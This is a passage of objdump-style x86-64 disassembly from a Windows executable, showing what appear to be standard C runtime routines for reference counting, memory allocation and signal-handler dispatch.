   14000a43f:	48 2b cf             	sub    %rdi,%rcx
   14000a442:	e8 d9 da ff ff       	call   0x140007f20
   14000a447:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   14000a44e:	e8 cd da ff ff       	call   0x140007f20
   14000a453:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   14000a45a:	e8 a5 00 00 00       	call   0x14000a504
   14000a45f:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   14000a466:	bd 06 00 00 00       	mov    $0x6,%ebp
   14000a46b:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   14000a46f:	48 8d 05 52 fd 00 00 	lea    0xfd52(%rip),%rax        # 0x14001a1c8
   14000a476:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   14000a47a:	74 1a                	je     0x14000a496
   14000a47c:	48 8b 0f             	mov    (%rdi),%rcx
   14000a47f:	48 85 c9             	test   %rcx,%rcx
   14000a482:	74 12                	je     0x14000a496
   14000a484:	83 39 00             	cmpl   $0x0,(%rcx)
   14000a487:	75 0d                	jne    0x14000a496
   14000a489:	e8 92 da ff ff       	call   0x140007f20
   14000a48e:	48 8b 0e             	mov    (%rsi),%rcx
   14000a491:	e8 8a da ff ff       	call   0x140007f20
   14000a496:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   14000a49b:	74 13                	je     0x14000a4b0
   14000a49d:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   14000a4a1:	48 85 c9             	test   %rcx,%rcx
   14000a4a4:	74 0a                	je     0x14000a4b0
   14000a4a6:	83 39 00             	cmpl   $0x0,(%rcx)
   14000a4a9:	75 05                	jne    0x14000a4b0
   14000a4ab:	e8 70 da ff ff       	call   0x140007f20
   14000a4b0:	48 83 c6 08          	add    $0x8,%rsi
   14000a4b4:	48 83 c7 20          	add    $0x20,%rdi
   14000a4b8:	48 83 ed 01          	sub    $0x1,%rbp
   14000a4bc:	75 b1                	jne    0x14000a46f
   14000a4be:	48 8b cb             	mov    %rbx,%rcx
   14000a4c1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a4c6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a4cb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000a4d0:	48 83 c4 20          	add    $0x20,%rsp
   14000a4d4:	5f                   	pop    %rdi
   14000a4d5:	e9 46 da ff ff       	jmp    0x140007f20
   14000a4da:	cc                   	int3
   14000a4db:	cc                   	int3
   14000a4dc:	48 85 c9             	test   %rcx,%rcx
   14000a4df:	74 1c                	je     0x14000a4fd
   14000a4e1:	48 8d 05 38 69 00 00 	lea    0x6938(%rip),%rax        # 0x140010e20
   14000a4e8:	48 3b c8             	cmp    %rax,%rcx
   14000a4eb:	74 10                	je     0x14000a4fd
   14000a4ed:	b8 01 00 00 00       	mov    $0x1,%eax
   14000a4f2:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   14000a4f9:	00 
   14000a4fa:	ff c0                	inc    %eax
   14000a4fc:	c3                   	ret
   14000a4fd:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000a502:	c3                   	ret
   14000a503:	cc                   	int3
   14000a504:	48 85 c9             	test   %rcx,%rcx
   14000a507:	74 30                	je     0x14000a539
   14000a509:	53                   	push   %rbx
   14000a50a:	48 83 ec 20          	sub    $0x20,%rsp
   14000a50e:	48 8d 05 0b 69 00 00 	lea    0x690b(%rip),%rax        # 0x140010e20
   14000a515:	48 8b d9             	mov    %rcx,%rbx
   14000a518:	48 3b c8             	cmp    %rax,%rcx
   14000a51b:	74 17                	je     0x14000a534
   14000a51d:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   14000a523:	85 c0                	test   %eax,%eax
   14000a525:	75 0d                	jne    0x14000a534
   14000a527:	e8 14 fb ff ff       	call   0x14000a040
   14000a52c:	48 8b cb             	mov    %rbx,%rcx
   14000a52f:	e8 ec d9 ff ff       	call   0x140007f20
   14000a534:	48 83 c4 20          	add    $0x20,%rsp
   14000a538:	5b                   	pop    %rbx
   14000a539:	c3                   	ret
   14000a53a:	cc                   	int3
   14000a53b:	cc                   	int3
   14000a53c:	48 85 c9             	test   %rcx,%rcx
   14000a53f:	74 1a                	je     0x14000a55b
   14000a541:	48 8d 05 d8 68 00 00 	lea    0x68d8(%rip),%rax        # 0x140010e20
   14000a548:	48 3b c8             	cmp    %rax,%rcx
   14000a54b:	74 0e                	je     0x14000a55b
   14000a54d:	83 c8 ff             	or     $0xffffffff,%eax
   14000a550:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   14000a557:	00 
   14000a558:	ff c8                	dec    %eax
   14000a55a:	c3                   	ret
   14000a55b:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000a560:	c3                   	ret
   14000a561:	cc                   	int3
   14000a562:	cc                   	int3
   14000a563:	cc                   	int3
   14000a564:	48 83 ec 28          	sub    $0x28,%rsp
   14000a568:	48 85 c9             	test   %rcx,%rcx
   14000a56b:	0f 84 96 00 00 00    	je     0x14000a607
   14000a571:	41 83 c9 ff          	or     $0xffffffff,%r9d
   14000a575:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   14000a57a:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   14000a581:	48 85 c0             	test   %rax,%rax
   14000a584:	74 04                	je     0x14000a58a
   14000a586:	f0 44 01 08          	lock add %r9d,(%rax)
   14000a58a:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   14000a591:	48 85 c0             	test   %rax,%rax
   14000a594:	74 04                	je     0x14000a59a
   14000a596:	f0 44 01 08          	lock add %r9d,(%rax)
   14000a59a:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   14000a5a1:	48 85 c0             	test   %rax,%rax
   14000a5a4:	74 04                	je     0x14000a5aa
   14000a5a6:	f0 44 01 08          	lock add %r9d,(%rax)
   14000a5aa:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   14000a5b1:	48 85 c0             	test   %rax,%rax
   14000a5b4:	74 04                	je     0x14000a5ba
   14000a5b6:	f0 44 01 08          	lock add %r9d,(%rax)
   14000a5ba:	48 8d 41 38          	lea    0x38(%rcx),%rax
   14000a5be:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000a5c4:	48 8d 15 fd fb 00 00 	lea    0xfbfd(%rip),%rdx        # 0x14001a1c8
   14000a5cb:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   14000a5cf:	74 0c                	je     0x14000a5dd
   14000a5d1:	48 8b 10             	mov    (%rax),%rdx
   14000a5d4:	48 85 d2             	test   %rdx,%rdx
   14000a5d7:	74 04                	je     0x14000a5dd
   14000a5d9:	f0 44 01 0a          	lock add %r9d,(%rdx)
   14000a5dd:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   14000a5e2:	74 0d                	je     0x14000a5f1
   14000a5e4:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   14000a5e8:	48 85 d2             	test   %rdx,%rdx
   14000a5eb:	74 04                	je     0x14000a5f1
   14000a5ed:	f0 44 01 0a          	lock add %r9d,(%rdx)
   14000a5f1:	48 83 c0 20          	add    $0x20,%rax
   14000a5f5:	49 83 e8 01          	sub    $0x1,%r8
   14000a5f9:	75 c9                	jne    0x14000a5c4
   14000a5fb:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   14000a602:	e8 35 ff ff ff       	call   0x14000a53c
   14000a607:	48 83 c4 28          	add    $0x28,%rsp
   14000a60b:	c3                   	ret
   14000a60c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a611:	57                   	push   %rdi
   14000a612:	48 83 ec 20          	sub    $0x20,%rsp
   14000a616:	e8 49 cb ff ff       	call   0x140007164
   14000a61b:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   14000a622:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   14000a628:	8b 05 82 01 01 00    	mov    0x10182(%rip),%eax        # 0x14001a7b0
   14000a62e:	85 c8                	test   %ecx,%eax
   14000a630:	74 08                	je     0x14000a63a
   14000a632:	48 8b 1f             	mov    (%rdi),%rbx
   14000a635:	48 85 db             	test   %rbx,%rbx
   14000a638:	75 2c                	jne    0x14000a666
   14000a63a:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000a63f:	e8 94 d7 ff ff       	call   0x140007dd8
   14000a644:	90                   	nop
   14000a645:	48 8b 15 e4 0e 01 00 	mov    0x10ee4(%rip),%rdx        # 0x14001b530
   14000a64c:	48 8b cf             	mov    %rdi,%rcx
   14000a64f:	e8 28 00 00 00       	call   0x14000a67c
   14000a654:	48 8b d8             	mov    %rax,%rbx
   14000a657:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000a65c:	e8 cb d7 ff ff       	call   0x140007e2c
   14000a661:	48 85 db             	test   %rbx,%rbx
   14000a664:	74 0e                	je     0x14000a674
   14000a666:	48 8b c3             	mov    %rbx,%rax
   14000a669:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a66e:	48 83 c4 20          	add    $0x20,%rsp
   14000a672:	5f                   	pop    %rdi
   14000a673:	c3                   	ret
   14000a674:	e8 57 c6 ff ff       	call   0x140006cd0
   14000a679:	90                   	nop
   14000a67a:	cc                   	int3
   14000a67b:	cc                   	int3
   14000a67c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a681:	57                   	push   %rdi
   14000a682:	48 83 ec 20          	sub    $0x20,%rsp
   14000a686:	48 8b fa             	mov    %rdx,%rdi
   14000a689:	48 85 d2             	test   %rdx,%rdx
   14000a68c:	74 46                	je     0x14000a6d4
   14000a68e:	48 85 c9             	test   %rcx,%rcx
   14000a691:	74 41                	je     0x14000a6d4
   14000a693:	48 8b 19             	mov    (%rcx),%rbx
   14000a696:	48 3b da             	cmp    %rdx,%rbx
   14000a699:	75 05                	jne    0x14000a6a0
   14000a69b:	48 8b c7             	mov    %rdi,%rax
   14000a69e:	eb 36                	jmp    0x14000a6d6
   14000a6a0:	48 89 39             	mov    %rdi,(%rcx)
   14000a6a3:	48 8b cf             	mov    %rdi,%rcx
   14000a6a6:	e8 2d fc ff ff       	call   0x14000a2d8
   14000a6ab:	48 85 db             	test   %rbx,%rbx
   14000a6ae:	74 eb                	je     0x14000a69b
   14000a6b0:	48 8b cb             	mov    %rbx,%rcx
   14000a6b3:	e8 ac fe ff ff       	call   0x14000a564
   14000a6b8:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   14000a6bc:	75 dd                	jne    0x14000a69b
   14000a6be:	48 8d 05 9b f9 00 00 	lea    0xf99b(%rip),%rax        # 0x14001a060
   14000a6c5:	48 3b d8             	cmp    %rax,%rbx
   14000a6c8:	74 d1                	je     0x14000a69b
   14000a6ca:	48 8b cb             	mov    %rbx,%rcx
   14000a6cd:	e8 92 fc ff ff       	call   0x14000a364
   14000a6d2:	eb c7                	jmp    0x14000a69b
   14000a6d4:	33 c0                	xor    %eax,%eax
   14000a6d6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a6db:	48 83 c4 20          	add    $0x20,%rsp
   14000a6df:	5f                   	pop    %rdi
   14000a6e0:	c3                   	ret
   14000a6e1:	cc                   	int3
   14000a6e2:	cc                   	int3
   14000a6e3:	cc                   	int3
   14000a6e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a6e9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a6ee:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a6f3:	57                   	push   %rdi
   14000a6f4:	48 83 ec 20          	sub    $0x20,%rsp
   14000a6f8:	49 8b e8             	mov    %r8,%rbp
   14000a6fb:	48 8b da             	mov    %rdx,%rbx
   14000a6fe:	48 8b f1             	mov    %rcx,%rsi
   14000a701:	48 85 d2             	test   %rdx,%rdx
   14000a704:	74 1d                	je     0x14000a723
   14000a706:	33 d2                	xor    %edx,%edx
   14000a708:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000a70c:	48 f7 f3             	div    %rbx
   14000a70f:	49 3b c0             	cmp    %r8,%rax
   14000a712:	73 0f                	jae    0x14000a723
   14000a714:	e8 27 d0 ff ff       	call   0x140007740
   14000a719:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000a71f:	33 c0                	xor    %eax,%eax
   14000a721:	eb 41                	jmp    0x14000a764
   14000a723:	48 85 f6             	test   %rsi,%rsi
   14000a726:	74 0a                	je     0x14000a732
   14000a728:	e8 2f 18 00 00       	call   0x14000bf5c
   14000a72d:	48 8b f8             	mov    %rax,%rdi
   14000a730:	eb 02                	jmp    0x14000a734
   14000a732:	33 ff                	xor    %edi,%edi
   14000a734:	48 0f af dd          	imul   %rbp,%rbx
   14000a738:	48 8b ce             	mov    %rsi,%rcx
   14000a73b:	48 8b d3             	mov    %rbx,%rdx
   14000a73e:	e8 55 18 00 00       	call   0x14000bf98
   14000a743:	48 8b f0             	mov    %rax,%rsi
   14000a746:	48 85 c0             	test   %rax,%rax
   14000a749:	74 16                	je     0x14000a761
   14000a74b:	48 3b fb             	cmp    %rbx,%rdi
   14000a74e:	73 11                	jae    0x14000a761
   14000a750:	48 2b df             	sub    %rdi,%rbx
   14000a753:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   14000a757:	4c 8b c3             	mov    %rbx,%r8
   14000a75a:	33 d2                	xor    %edx,%edx
   14000a75c:	e8 6f 9f ff ff       	call   0x1400046d0
   14000a761:	48 8b c6             	mov    %rsi,%rax
   14000a764:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a769:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a76e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000a773:	48 83 c4 20          	add    $0x20,%rsp
   14000a777:	5f                   	pop    %rdi
   14000a778:	c3                   	ret
   14000a779:	cc                   	int3
   14000a77a:	cc                   	int3
   14000a77b:	cc                   	int3
   14000a77c:	48 83 ec 28          	sub    $0x28,%rsp
   14000a780:	ff 15 f2 4a 00 00    	call   *0x4af2(%rip)        # 0x14000f278
   14000a786:	48 85 c0             	test   %rax,%rax
   14000a789:	48 89 05 50 14 01 00 	mov    %rax,0x11450(%rip)        # 0x14001bbe0
   14000a790:	0f 95 c0             	setne  %al
   14000a793:	48 83 c4 28          	add    $0x28,%rsp
   14000a797:	c3                   	ret
   14000a798:	48 83 25 40 14 01 00 	andq   $0x0,0x11440(%rip)        # 0x14001bbe0
   14000a79f:	00 
   14000a7a0:	b0 01                	mov    $0x1,%al
   14000a7a2:	c3                   	ret
   14000a7a3:	cc                   	int3
   14000a7a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a7a9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a7ae:	57                   	push   %rdi
   14000a7af:	48 83 ec 20          	sub    $0x20,%rsp
   14000a7b3:	48 8b f2             	mov    %rdx,%rsi
   14000a7b6:	48 8b f9             	mov    %rcx,%rdi
   14000a7b9:	48 3b ca             	cmp    %rdx,%rcx
   14000a7bc:	74 54                	je     0x14000a812
   14000a7be:	48 8b d9             	mov    %rcx,%rbx
   14000a7c1:	48 8b 03             	mov    (%rbx),%rax
   14000a7c4:	48 85 c0             	test   %rax,%rax
   14000a7c7:	74 0a                	je     0x14000a7d3
   14000a7c9:	ff 15 89 4c 00 00    	call   *0x4c89(%rip)        # 0x14000f458
   14000a7cf:	84 c0                	test   %al,%al
   14000a7d1:	74 09                	je     0x14000a7dc
   14000a7d3:	48 83 c3 10          	add    $0x10,%rbx
   14000a7d7:	48 3b de             	cmp    %rsi,%rbx
   14000a7da:	75 e5                	jne    0x14000a7c1
   14000a7dc:	48 3b de             	cmp    %rsi,%rbx
   14000a7df:	74 31                	je     0x14000a812
   14000a7e1:	48 3b df             	cmp    %rdi,%rbx
   14000a7e4:	74 28                	je     0x14000a80e
   14000a7e6:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   14000a7ea:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   14000a7ef:	74 10                	je     0x14000a801
   14000a7f1:	48 8b 03             	mov    (%rbx),%rax
   14000a7f4:	48 85 c0             	test   %rax,%rax
   14000a7f7:	74 08                	je     0x14000a801
   14000a7f9:	33 c9                	xor    %ecx,%ecx
   14000a7fb:	ff 15 57 4c 00 00    	call   *0x4c57(%rip)        # 0x14000f458
   14000a801:	48 83 eb 10          	sub    $0x10,%rbx
   14000a805:	48 8d 43 08          	lea    0x8(%rbx),%rax
   14000a809:	48 3b c7             	cmp    %rdi,%rax
   14000a80c:	75 dc                	jne    0x14000a7ea
   14000a80e:	32 c0                	xor    %al,%al
   14000a810:	eb 02                	jmp    0x14000a814
   14000a812:	b0 01                	mov    $0x1,%al
   14000a814:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a819:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000a81e:	48 83 c4 20          	add    $0x20,%rsp
   14000a822:	5f                   	pop    %rdi
   14000a823:	c3                   	ret
   14000a824:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a829:	57                   	push   %rdi
   14000a82a:	48 83 ec 20          	sub    $0x20,%rsp
   14000a82e:	48 8b da             	mov    %rdx,%rbx
   14000a831:	48 8b f9             	mov    %rcx,%rdi
   14000a834:	48 3b ca             	cmp    %rdx,%rcx
   14000a837:	74 1a                	je     0x14000a853
   14000a839:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   14000a83d:	48 85 c0             	test   %rax,%rax
   14000a840:	74 08                	je     0x14000a84a
   14000a842:	33 c9                	xor    %ecx,%ecx
   14000a844:	ff 15 0e 4c 00 00    	call   *0x4c0e(%rip)        # 0x14000f458
   14000a84a:	48 83 eb 10          	sub    $0x10,%rbx
   14000a84e:	48 3b df             	cmp    %rdi,%rbx
   14000a851:	75 e6                	jne    0x14000a839
   14000a853:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a858:	b0 01                	mov    $0x1,%al
   14000a85a:	48 83 c4 20          	add    $0x20,%rsp
   14000a85e:	5f                   	pop    %rdi
   14000a85f:	c3                   	ret
   14000a860:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a865:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a86a:	57                   	push   %rdi
   14000a86b:	48 83 ec 20          	sub    $0x20,%rsp
   14000a86f:	49 8b f9             	mov    %r9,%rdi
   14000a872:	8b 0a                	mov    (%rdx),%ecx
   14000a874:	e8 5f d5 ff ff       	call   0x140007dd8
   14000a879:	90                   	nop
   14000a87a:	48 8b 1d 7f f7 00 00 	mov    0xf77f(%rip),%rbx        # 0x14001a000
   14000a881:	8b cb                	mov    %ebx,%ecx
   14000a883:	83 e1 3f             	and    $0x3f,%ecx
   14000a886:	48 33 1d 6b 13 01 00 	xor    0x1136b(%rip),%rbx        # 0x14001bbf8
   14000a88d:	48 d3 cb             	ror    %cl,%rbx
   14000a890:	8b 0f                	mov    (%rdi),%ecx
   14000a892:	e8 95 d5 ff ff       	call   0x140007e2c
   14000a897:	48 8b c3             	mov    %rbx,%rax
   14000a89a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a89f:	48 83 c4 20          	add    $0x20,%rsp
   14000a8a3:	5f                   	pop    %rdi
   14000a8a4:	c3                   	ret
   14000a8a5:	cc                   	int3
   14000a8a6:	cc                   	int3
   14000a8a7:	cc                   	int3
   14000a8a8:	4c 8b dc             	mov    %rsp,%r11
   14000a8ab:	48 83 ec 28          	sub    $0x28,%rsp
   14000a8af:	b8 03 00 00 00       	mov    $0x3,%eax
   14000a8b4:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   14000a8b8:	4d 8d 43 08          	lea    0x8(%r11),%r8
   14000a8bc:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000a8c0:	49 8d 53 18          	lea    0x18(%r11),%rdx
   14000a8c4:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000a8c8:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   14000a8cc:	e8 8f ff ff ff       	call   0x14000a860
   14000a8d1:	48 83 c4 28          	add    $0x28,%rsp
   14000a8d5:	c3                   	ret
   14000a8d6:	cc                   	int3
   14000a8d7:	cc                   	int3
   14000a8d8:	48 89 0d 09 13 01 00 	mov    %rcx,0x11309(%rip)        # 0x14001bbe8
   14000a8df:	48 89 0d 0a 13 01 00 	mov    %rcx,0x1130a(%rip)        # 0x14001bbf0
   14000a8e6:	48 89 0d 0b 13 01 00 	mov    %rcx,0x1130b(%rip)        # 0x14001bbf8
   14000a8ed:	48 89 0d 0c 13 01 00 	mov    %rcx,0x1130c(%rip)        # 0x14001bc00
   14000a8f4:	c3                   	ret
   14000a8f5:	cc                   	int3
   14000a8f6:	cc                   	int3
   14000a8f7:	cc                   	int3
   14000a8f8:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000a8fd:	56                   	push   %rsi
   14000a8fe:	57                   	push   %rdi
   14000a8ff:	41 54                	push   %r12
   14000a901:	41 55                	push   %r13
   14000a903:	41 56                	push   %r14
   14000a905:	48 83 ec 40          	sub    $0x40,%rsp
   14000a909:	8b d9                	mov    %ecx,%ebx
   14000a90b:	45 33 ed             	xor    %r13d,%r13d
   14000a90e:	44 21 6c 24 78       	and    %r13d,0x78(%rsp)
   14000a913:	41 b6 01             	mov    $0x1,%r14b
   14000a916:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   14000a91b:	83 f9 02             	cmp    $0x2,%ecx
   14000a91e:	74 21                	je     0x14000a941
   14000a920:	83 f9 04             	cmp    $0x4,%ecx
   14000a923:	74 4c                	je     0x14000a971
   14000a925:	83 f9 06             	cmp    $0x6,%ecx
   14000a928:	74 17                	je     0x14000a941
   14000a92a:	83 f9 08             	cmp    $0x8,%ecx
   14000a92d:	74 42                	je     0x14000a971
   14000a92f:	83 f9 0b             	cmp    $0xb,%ecx
   14000a932:	74 3d                	je     0x14000a971
   14000a934:	83 f9 0f             	cmp    $0xf,%ecx
   14000a937:	74 08                	je     0x14000a941
   14000a939:	8d 41 eb             	lea    -0x15(%rcx),%eax
   14000a93c:	83 f8 01             	cmp    $0x1,%eax
   14000a93f:	77 7d                	ja     0x14000a9be
   14000a941:	83 e9 02             	sub    $0x2,%ecx
   14000a944:	0f 84 af 00 00 00    	je     0x14000a9f9
   14000a94a:	83 e9 04             	sub    $0x4,%ecx
   14000a94d:	0f 84 8b 00 00 00    	je     0x14000a9de
   14000a953:	83 e9 09             	sub    $0x9,%ecx
   14000a956:	0f 84 94 00 00 00    	je     0x14000a9f0
   14000a95c:	83 e9 06             	sub    $0x6,%ecx
   14000a95f:	0f 84 82 00 00 00    	je     0x14000a9e7
   14000a965:	83 f9 01             	cmp    $0x1,%ecx
   14000a968:	74 74                	je     0x14000a9de
   14000a96a:	33 ff                	xor    %edi,%edi
   14000a96c:	e9 8f 00 00 00       	jmp    0x14000aa00
   14000a971:	e8 6a c9 ff ff       	call   0x1400072e0
   14000a976:	4c 8b e8             	mov    %rax,%r13
   14000a979:	48 85 c0             	test   %rax,%rax
   14000a97c:	75 18                	jne    0x14000a996
   14000a97e:	83 c8 ff             	or     $0xffffffff,%eax
   14000a981:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   14000a988:	00 
   14000a989:	48 83 c4 40          	add    $0x40,%rsp
   14000a98d:	41 5e                	pop    %r14
   14000a98f:	41 5d                	pop    %r13
   14000a991:	41 5c                	pop    %r12
   14000a993:	5f                   	pop    %rdi
   14000a994:	5e                   	pop    %rsi
   14000a995:	c3                   	ret
   14000a996:	48 8b 00             	mov    (%rax),%rax
   14000a999:	48 8b 0d 20 5c 00 00 	mov    0x5c20(%rip),%rcx        # 0x1400105c0
   14000a9a0:	48 c1 e1 04          	shl    $0x4,%rcx
   14000a9a4:	48 03 c8             	add    %rax,%rcx
   14000a9a7:	eb 09                	jmp    0x14000a9b2
   14000a9a9:	39 58 04             	cmp    %ebx,0x4(%rax)
   14000a9ac:	74 0b                	je     0x14000a9b9
   14000a9ae:	48 83 c0 10          	add    $0x10,%rax
   14000a9b2:	48 3b c1             	cmp    %rcx,%rax
   14000a9b5:	75 f2                	jne    0x14000a9a9
   14000a9b7:	33 c0                	xor    %eax,%eax
   14000a9b9:	48 85 c0             	test   %rax,%rax
   14000a9bc:	75 12                	jne    0x14000a9d0
   14000a9be:	e8 7d cd ff ff       	call   0x140007740
   14000a9c3:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a9c9:	e8 52 cc ff ff       	call   0x140007620
   14000a9ce:	eb ae                	jmp    0x14000a97e
   14000a9d0:	48 8d 78 08          	lea    0x8(%rax),%rdi
   14000a9d4:	45 32 f6             	xor    %r14b,%r14b
   14000a9d7:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   14000a9dc:	eb 22                	jmp    0x14000aa00
   14000a9de:	48 8d 3d 13 12 01 00 	lea    0x11213(%rip),%rdi        # 0x14001bbf8
   14000a9e5:	eb 19                	jmp    0x14000aa00
   14000a9e7:	48 8d 3d 02 12 01 00 	lea    0x11202(%rip),%rdi        # 0x14001bbf0
   14000a9ee:	eb 10                	jmp    0x14000aa00
   14000a9f0:	48 8d 3d 09 12 01 00 	lea    0x11209(%rip),%rdi        # 0x14001bc00
   14000a9f7:	eb 07                	jmp    0x14000aa00
   14000a9f9:	48 8d 3d e8 11 01 00 	lea    0x111e8(%rip),%rdi        # 0x14001bbe8
   14000aa00:	48 83 a4 24 80 00 00 	andq   $0x0,0x80(%rsp)
   14000aa07:	00 00 
   14000aa09:	45 84 f6             	test   %r14b,%r14b
   14000aa0c:	74 0b                	je     0x14000aa19
   14000aa0e:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000aa13:	e8 c0 d3 ff ff       	call   0x140007dd8
   14000aa18:	90                   	nop
   14000aa19:	48 8b 37             	mov    (%rdi),%rsi
   14000aa1c:	45 84 f6             	test   %r14b,%r14b
   14000aa1f:	74 12                	je     0x14000aa33
   14000aa21:	48 8b 05 d8 f5 00 00 	mov    0xf5d8(%rip),%rax        # 0x14001a000
   14000aa28:	8b c8                	mov    %eax,%ecx
   14000aa2a:	83 e1 3f             	and    $0x3f,%ecx
   14000aa2d:	48 33 f0             	xor    %rax,%rsi
   14000aa30:	48 d3 ce             	ror    %cl,%rsi
   14000aa33:	48 83 fe 01          	cmp    $0x1,%rsi
   14000aa37:	0f 84 94 00 00 00    	je     0x14000aad1
   14000aa3d:	48 85 f6             	test   %rsi,%rsi
   14000aa40:	0f 84 03 01 00 00    	je     0x14000ab49
   14000aa46:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000aa4c:	83 fb 0b             	cmp    $0xb,%ebx
   14000aa4f:	77 3d                	ja     0x14000aa8e
   14000aa51:	41 0f a3 dc          	bt     %ebx,%r12d
   14000aa55:	73 37                	jae    0x14000aa8e
   14000aa57:	49 8b 45 08          	mov    0x8(%r13),%rax
   14000aa5b:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   14000aa62:	00 
   14000aa63:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000aa68:	49 83 65 08 00       	andq   $0x0,0x8(%r13)
   14000aa6d:	83 fb 08             	cmp    $0x8,%ebx
   14000aa70:	75 53                	jne    0x14000aac5
   14000aa72:	e8 ed c6 ff ff       	call   0x140007164
   14000aa77:	8b 40 10             	mov    0x10(%rax),%eax
   14000aa7a:	89 44 24 78          	mov    %eax,0x78(%rsp)
   14000aa7e:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000aa82:	e8 dd c6 ff ff       	call   0x140007164
   14000aa87:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   14000aa8e:	83 fb 08             	cmp    $0x8,%ebx
   14000aa91:	75 32                	jne    0x14000aac5
   14000aa93:	48 8b 05 2e 5b 00 00 	mov    0x5b2e(%rip),%rax        # 0x1400105c8
   14000aa9a:	48 c1 e0 04          	shl    $0x4,%rax
   14000aa9e:	49 03 45 00          	add    0x0(%r13),%rax
   14000aaa2:	48 8b 0d 27 5b 00 00 	mov    0x5b27(%rip),%rcx        # 0x1400105d0
   14000aaa9:	48 c1 e1 04          	shl    $0x4,%rcx
   14000aaad:	48 03 c8             	add    %rax,%rcx
   14000aab0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000aab5:	48 3b c1             	cmp    %rcx,%rax
   14000aab8:	74 1d                	je     0x14000aad7
   14000aaba:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   14000aabf:	48 83 c0 10          	add    $0x10,%rax
   14000aac3:	eb eb                	jmp    0x14000aab0
   14000aac5:	48 8b 05 34 f5 00 00 	mov    0xf534(%rip),%rax        # 0x14001a000
   14000aacc:	48 89 07             	mov    %rax,(%rdi)
   14000aacf:	eb 06                	jmp    0x14000aad7
   14000aad1:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000aad7:	45 84 f6             	test   %r14b,%r14b
   14000aada:	74 0a                	je     0x14000aae6
   14000aadc:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000aae1:	e8 46 d3 ff ff       	call   0x140007e2c
   14000aae6:	48 83 fe 01          	cmp    $0x1,%rsi
   14000aaea:	75 07                	jne    0x14000aaf3
   14000aaec:	33 c0                	xor    %eax,%eax
   14000aaee:	e9 8e fe ff ff       	jmp    0x14000a981
   14000aaf3:	83 fb 08             	cmp    $0x8,%ebx
   14000aaf6:	75 19                	jne    0x14000ab11
